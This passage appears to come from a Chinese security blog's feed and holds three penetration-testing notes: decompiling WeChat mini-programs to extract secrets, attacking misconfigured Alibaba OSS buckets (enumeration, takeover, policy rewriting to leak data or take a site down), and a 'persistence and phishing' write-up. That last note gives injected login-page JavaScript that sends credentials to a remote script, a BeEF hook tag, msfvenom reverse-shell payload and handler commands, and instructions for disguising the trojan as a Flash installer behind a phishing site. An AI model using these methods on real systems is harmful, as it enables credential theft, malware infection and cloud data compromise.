src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%201-1723536749584-11.png" class="" title="Untitled 1-1723536749584-11"><h3 id="2、使用解密-反编译工具开始反编译"><a href="#2、使用解密-反编译工具开始反编译" class="headerlink" title="2、使用解密&amp;反编译工具开始反编译"></a>2、使用解密&amp;反编译工具开始反编译</h3><p>反编译的工具还有unveilr（<a href="https://github.com/junxiaqiao/unveilr-v2.0.0%EF%BC%89%E3%80%81%E5%B0%8F%E9%94%A6%E5%93%A5%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%B7%A5%E5%85%B7%EF%BC%88[https://get-shell.com/3458.html](https://get-shell.com/3458.html)%EF%BC%89%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%BB%8F%E8%BF%87%E5%8F%8D%E7%BC%96%E8%AF%91%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E5%AF%B9%E6%AF%94%E5%BE%97%E5%87%BA%EF%BC%9A%E8%99%BD%E7%84%B6wxapkg%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%86%85%E5%AE%B9%E6%AF%94%E4%B8%8A%E8%BF%B0%E4%B8%A4%E6%AC%BE%E6%9B%B4%E5%A4%9A%EF%BC%8C%E4%BD%86unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E6%9B%B4%E7%AC%A6%E5%90%88%E4%BC%A0%E7%BB%9F%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%8C%E6%9B%B4%E9%80%82%E5%90%88%E6%88%91%E4%BB%AC%E5%88%86%E6%9E%90%EF%BC%8C%E5%8F%AA%E8%83%BD%E8%AF%B4%E5%90%84%E6%9C%89%E4%BC%98%E5%8A%A3%E3%80%82">https://github.com/junxiaqiao/unveilr-v2.0.0）、小锦哥小程序工具（[https://get-shell.com/3458.html](https://get-shell.com/3458.html)），不过经过反编译后的结果对比得出：虽然wxapkg反编译的内容比上述两款更多，但unveilr反编译更符合传统的微信小程序的目录结构，更适合我们分析，只能说各有优劣。</a></p><p>1、wxapkg</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">wxapkg.exe unpack <span class="hljs-operator">-</span>o unpack <span class="hljs-operator">-</span>r &quot;E:/ASUS/Documents/WeChat Files/Applet/wx1467dbe575243210&quot;<br></code></pre></td></tr></table></figure><img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%202-1723536749584-10.png" class="" title="Untitled 2-1723536749584-10"><p>但这并不是最初的原项目文件结构，原因是微信服务器会将小程序源码中所有的“js”文件压入“app-service.js”文件中，将所有的“json”文件压入“app-config.json”中，将所有的“wxml”文件压入“page-frame.js”文件中，“wxss”则在处理之后以“js”文件的形式存留在对应页面目录之下。</p><p>2、unveilr</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">unveilr.exe wx &quot;D:/WeChat Files/Applet/wx7c8d593b2c3a7703/92/&quot; <span class="hljs-operator">-</span>o .<span class="hljs-operator">/</span>tyt <span class="hljs-operator">-</span>f<br></code></pre></td></tr></table></figure><img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%203-1723536749584-12.png" class="" title="Untitled 3-1723536749584-12"><h3 id="3、编译完成"><a href="#3、编译完成" class="headerlink" title="3、编译完成"></a>3、编译完成</h3><p>访问反编译成功的文件，开始提取敏感信息和代码审计即可</p><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><p>弱口令、AS、AK、敏感信息、接口泄露</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OSS云存储攻防</title>
    <link href="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/"/>
    <url>/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="阿里云OSS对象攻防"><a href="#阿里云OSS对象攻防" class="headerlink" title="阿里云OSS对象攻防"></a>阿里云OSS对象攻防</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>阿里云对象储存（OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。数据以对象（Object）的形式存储在OSS的存储空间&#x2F;存储桶（Bucket ）中，并指定Object的文件名（Key）作为其唯一标识。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。</p></blockquote><p>上述概念介绍</p><p>Bucket：用户用来管理所存储Object的储物空间。<br>Object：OSS存储数据的基本单元。<br>Key：当存储文件（Object）时，需要指定此Object的名称（Key），后续您将通过这个Key来获取该Object的内容。 Key也可以用来模拟文件夹的一些属性。<br>Data：存储的数据本体。</p><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a><strong>常见漏洞</strong></h2><h3 id="1、Bucket权限配置错误-公开访问"><a href="#1、Bucket权限配置错误-公开访问" class="headerlink" title="1、Bucket权限配置错误-公开访问"></a><strong>1、Bucket权限配置错误-公开访问</strong></h3><p>在默认情况下创建的Bucket桶是private权限，如果在错误配置的情况下，给了Listobject权限，就会导致可遍历存储桶。</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813171658798.png" class="" title="image-20240813171658798"><p>如果选择了””公有读&#x2F;公有读写”,就会存在两种情况：</p><p>1、无法列出对象</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813171703411.png" class="" title="image-20240813171703411"><p>但是可以直接访问KEY路径</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140122031-1723540766933-2.png" class="" title="image-20240813140122031"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140220450-1723540766933-1.png" class="" title="image-20240813140220450"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140233142-1723540766934-5.png" class="" title="image-20240813140233142"><p>2、如果想列出Object对象，只需要在Bucket授权策略中设置ListObject即可</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140242336-1723540766934-3.png" class="" title="image-20240813140242336"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140253776-1723540766934-4.png" class="" title="image-20240813140253776"><p>这样再当我们访问存储桶域名的时候就会发现，已经把我们存储桶的东西列出来了</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140306422-1723540766934-6.png" class="" title="image-20240813140306422"><h3 id="2、Bucket桶爆破"><a href="#2、Bucket桶爆破" class="headerlink" title="2、Bucket桶爆破"></a>2、Bucket桶爆破</h3><p>当不明确Bucket桶名称时，可以通过爆破获取，类似子域名的枚举。</p><p>当对于阿里云OSS 不存在有两种返回情况，分别是 InvalidBucketName 和 NoSuchBucket</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140316872-1723540766934-7.png" class="" title="image-20240813140316872"><p><strong>InvalidBucketName</strong>：表示存储桶的名称不符合规范，属于无效的存储桶名称</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140326524-1723540766934-8.png" class="" title="image-20240813140326524"><p><strong>NoSuchBucket</strong>：表示没有这个存储桶</p><p>当存储桶存在时，则会返回以下两种情况</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140336639-1723540766934-9.png" class="" title="image-20240813140336639"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140349126-1723540766934-12.png" class="" title="image-20240813140349126"><p>这样通过返回内容的不同，就可以进行 Bucket 名称爆破了，知道 Bucket 名称后，Key 的爆破就类似目录一般爆破即可。</p><h3 id="3、特定的Bucket策略配置"><a href="#3、特定的Bucket策略配置" class="headerlink" title="3、特定的Bucket策略配置"></a><strong>3、特定的Bucket策略配置</strong></h3><p>特定的策略配置的指的是，如果管理员设置了某些IP，UA才可以请求该存储桶的话，此时如果错误的配置了GetBucketPolicy，可导致攻击者获取策略配置</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140357920-1723540766934-10.png" class="" title="image-20240813140357920"><p>可以看到我们此时是没有权限访问该存储桶的，不过我们可以尝试使用aliyun的cli（<a href="https://shell.aliyun.com/?spm=a2c4g.11186623.0.0.5a9176f1xLSwGL">https://shell.aliyun.com</a>）获取policy</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140419195-1723540766934-11.png" class="" title="image-20240813140419195"><p>我们可以看到，需要符合UserAgent为UzJu才可以访问</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140432212-1723540766934-13.png" class="" title="image-20240813140432212"><h3 id="4、Bucket-Object遍历"><a href="#4、Bucket-Object遍历" class="headerlink" title="4、Bucket Object遍历"></a><strong>4、Bucket Object遍历</strong></h3><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212133217024-1723540766934-14.png" class="" title="UzJuMarkDownImageimage-20220212133217024"><p>如果设置了ListObject，这将会导致Bucket桶被遍历</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140549402-1723540766934-15.png" class="" title="image-20240813140549402"><p>可通过访问Key，来下载Bucket中所有文件</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140601717-1723540766934-16.png" class="" title="image-20240813140601717"><h3 id="5、任意文件上传与覆盖"><a href="#5、任意文件上传与覆盖" class="headerlink" title="5、任意文件上传与覆盖"></a><strong>5、任意文件上传与覆盖</strong></h3><p>如果在配置存储桶时，管理员错误的将存储桶权限，配置为可写，这将会导致攻击者可上传任意文件到存储桶中，或覆盖已经存在的文件</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140615054-1723540766934-17.png" class="" title="image-20240813140615054"><p>PUT请求上传任意文件。</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140648104-1723540766934-18.png" class="" title="image-20240813140648104"><p>GET访问，证明上传文件存在</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/image-20240813140659657-1723540766934-21.png" class="" title="image-20240813140659657"><p>如果目标的对象存储是 html、XML 文件时，可以通过浏览器自解析html和xml文件的特性，利用任意文件上传进行 XSS 钓鱼、挂暗链、挂黑页、供应链投毒等操作。也可上传其他格式文件，但无法被利用，因为其只有存储文件功能，无法达到解析效果。</p><h3 id="6、AccessKeyId，SecretAccessKey泄露"><a href="#6、AccessKeyId，SecretAccessKey泄露" class="headerlink" title="6、AccessKeyId，SecretAccessKey泄露"></a><strong>6、AccessKeyId，SecretAccessKey泄露</strong></h3><p>如果目标的 AccessKeyId、SecretAccessKey 泄露，那么就能获取到目标对象存储的所有权限，一般可以通过以下几种方法进行收集：</p><p><strong>1、</strong>通过GitHub等开源平台中的源代码可发现存在泄露的Key</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212134350154-1723540766934-22.png" class="" title="UzJuMarkDownImageimage-20220212134350154"><p><strong>2、</strong>通过反编译APK、小程序，找到敏感信息</p><p><strong>3、</strong>在目标网站源代码中找到（Js等）</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageUzJuMarkDownImagedownload_image-1723540766934-20.png" class="" title="UzJuMarkDownImageUzJuMarkDownImagedownload_image"><p>然后在行云管家上直接通过AS、AK接管云存储</p><p>或者使用AK、AS利用工具</p><h3 id="7、Bucket接管"><a href="#7、Bucket接管" class="headerlink" title="7、Bucket接管"></a><strong>7、Bucket接管</strong></h3><p>在阿里云下，当 Bucket 显示 NoSuchBucket 说明是可以接管的，如果显示 AccessDenied 则不行。</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212134841569-1723540766934-19.png" class="" title="UzJuMarkDownImageimage-20220212134841569"><p>假设有以下一种情况，管理员通过域名解析并绑定了一个存储桶，但是管理员将存储桶删除后，没有将域名解析的CNAME删除，这时会访问域名就会出现上面的情况，<strong>NoSuchBucket</strong>。</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212135014007-1723540766934-23.png" class="" title="UzJuMarkDownImageimage-20220212135014007"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212135053519-1723540766934-25.png" class="" title="UzJuMarkDownImageimage-20220212135053519"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212135121070-1723540766934-26.png" class="" title="UzJuMarkDownImageimage-20220212135121070"><p>现在我们将存储桶删除，就会出现如下情况</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212135244909-1723540766934-27.png" class="" title="UzJuMarkDownImageimage-20220212135244909"><p>现在我们再访问域名会出现如下情况</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212135316238-1723540766934-24.png" class="" title="UzJuMarkDownImageimage-20220212135316238"><p>现在阿里云加了限制，必须在传输管理中配置绑定域名即可。以下情况即可接管该存储桶</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212135948743-1723540766934-28.png" class="" title="UzJuMarkDownImageimage-20220212135948743"><p>当我们访问存储桶的域名时，提示我们NoSuchBucket，这个时候可以登录自己的阿里云账号，创建同样的名称即可</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212140112615-1723540766934-29.png" class="" title="UzJuMarkDownImageimage-20220212140112615"><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212140129779-1723540766934-30.png" class="" title="UzJuMarkDownImageimage-20220212140129779"><p>此时我们刷新</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212140150975-1723540766934-31.png" class="" title="UzJuMarkDownImageimage-20220212140150975"><p>已经成功接管了该存储桶，尝试上传文件后配置权限公开访问</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220212140256729-1723540766934-32.png" class="" title="UzJuMarkDownImageimage-20220212140256729"><h3 id="8、Bucket-策略配置可写"><a href="#8、Bucket-策略配置可写" class="headerlink" title="8、Bucket 策略配置可写"></a><strong>8、Bucket 策略配置可写</strong></h3><p>当我们访问存储桶的时候，会提示我们已经被policy拦截</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214111642789-1723540766934-33.png" class="" title="UzJuMarkDownImageimage-20220214111642789"><p>如果此时配置了存储桶的oss:PutBucketPolicy，就可以更改Deny为Allow即可访问</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214111722663-1723540766934-36.png" class="" title="UzJuMarkDownImageimage-20220214111722663"><p>我们可以看到Effect中设置为Deny，我们只需要vim将它更改为Allow即可</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214111722663-1-1723540766934-34.png" class="" title="UzJuMarkDownImageimage-20220214111722663-1"><p>随后使用PUT方法上传</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214112030036-1723540766934-35.png" class="" title="UzJuMarkDownImageimage-20220214112030036"><p>随后我们再使用GET获取</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214112059318-1723540766934-37.png" class="" title="UzJuMarkDownImageimage-20220214112059318"><p>此时我们可以正常看到存储桶中的对象了</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214112115270-1723540766934-39.png" class="" title="UzJuMarkDownImageimage-20220214112115270"><h3 id="9、修改策略导致网站瘫痪"><a href="#9、修改策略导致网站瘫痪" class="headerlink" title="9、修改策略导致网站瘫痪"></a><strong>9、修改策略导致网站瘫痪</strong></h3><p>当策略可写的时候，除了上面的将可原本不可访问的数据设置为可访问从而获得敏感数据外，如果目标网站引用了某个 s3 上的资源文件，而且我们可以对该策略进行读写的话，也可以将原本可访问的资源权限设置为不可访问，这样就会导致网站瘫痪了。</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214114352567-1723540766934-38.png" class="" title="UzJuMarkDownImageimage-20220214114352567"><p>此时我们如果可以修改策略，我们只需要将获取该对象的权限修改为Deny，该网站既无法在获取图片，JS等信息了</p><img src="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/UzJuMarkDownImageimage-20220214114934078-1723540766934-40.png" class="" title="UzJuMarkDownImageimage-20220214114934078"><p>就无法访问了</p><p><img src="E:/yf/4-博客/Yf3_te/渗透笔记/image/1/image-20240813171951610.png" alt="image-20240813171951610"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>模拟实战权限维持-钓鱼</title>
    <link href="/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/"/>
    <url>/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/</url>
    
    <content type="html"><![CDATA[<h2 id="权限维持实战："><a href="#权限维持实战：" class="headerlink" title="权限维持实战："></a>权限维持实战：</h2><p><strong>权限维持，获取登录记录</strong></p><p>前提：拿到了web权限，例如：www-data：shell权限</p><p>然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php</p><img src="/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled-1723538357593-1.png" class="" title="Untitled-1723538357593-1"><p>在get.php文件中包含文件写入代码</p><img src="/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%201-1723538357593-2.png" class="" title="Untitled 1-1723538357593-2"><p>每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码</p><p>还可以直接远程连接beef，只需要修改js代码为</p><script src=http://192.168.43.43:3000/hook.js></script><h2 id="2、钓鱼实战"><a href="#2、钓鱼实战" class="headerlink" title="2、钓鱼实战"></a>2、钓鱼实战</h2><h3 id="1、msf生成木马文件"><a href="#1、msf生成木马文件" class="headerlink" title="1、msf生成木马文件"></a>1、msf生成木马文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">msfvenom <span class="hljs-operator">-</span>p windows<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp LHOST<span class="hljs-operator">=</span><span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.43</span><br>LPORT<span class="hljs-operator">=</span><span class="hljs-number">6666</span> <span class="hljs-operator">-</span>f exe <span class="hljs-operator">&gt;</span> flash.exe<br><span class="hljs-number">2</span>、下载官方文件<span class="hljs-operator">-</span>保证安装正常<br><span class="hljs-number">3</span>、压缩捆绑文件<span class="hljs-operator">-</span>解压提取运行<br><span class="hljs-number">4</span>、MSF 配置监听状态<br>use exploit<span class="hljs-operator">/</span>multi<span class="hljs-operator">/</span>handler<br><span class="hljs-keyword">set</span> payload windows<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp<br><span class="hljs-keyword">set</span> lhost <span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.43</span><br><span class="hljs-keyword">set</span> lport <span class="hljs-number">6666</span><br>run<br></code></pre></td></tr></table></figure><h3 id="2、木马文件封装思路"><a href="#2、木马文件封装思路" class="headerlink" title="2、木马文件封装思路"></a>2、木马文件封装思路</h3><p>为了掩人耳目，可以把木马文件和flash正经文件封装到压缩包里面，然后使用winrar工具进行自解压相关操作，找到选项解压前运行木马文件，这样当对方打开zip文件解压前，就会无声无息的运行我们的木马文件</p><img src="/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%202-1723538357593-3.png" class="" title="Untitled 2-1723538357593-3"><img src="/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%203-1723538357593-4.png" class="" title="Untitled 3-1723538357593-4"><p>再把文件名改为flash_install.exe文件，同时为了更加逼真，我们还可以修改文件图标</p><p>Restorator(图标修改工具)，修改过程就找到一个酷似flash官方的图标，然后工具替换就行了</p><p>成品展示：</p><img src="/2024/05/13/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%204.png" class="" title="Untitled 4"><h3 id="3、网站设计思路"><a href="#3、网站设计思路" class="headerlink" title="3、网站设计思路"></a>3、网站设计思路</h3><p>我们直接发送木马，对方肯定不会傻到直接点入，此时就要学会做钓鱼网站，勾起他的兴趣，比如放一个视频，但是当对方访问时显示flash版本不够，此时就重定向到自己编辑的网站，当按下安装键，就会让对方下载，然后运行</p><p>然后利用虚拟机(NAT)完成实战即可，不知道桥接模式能否成功，没试过</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
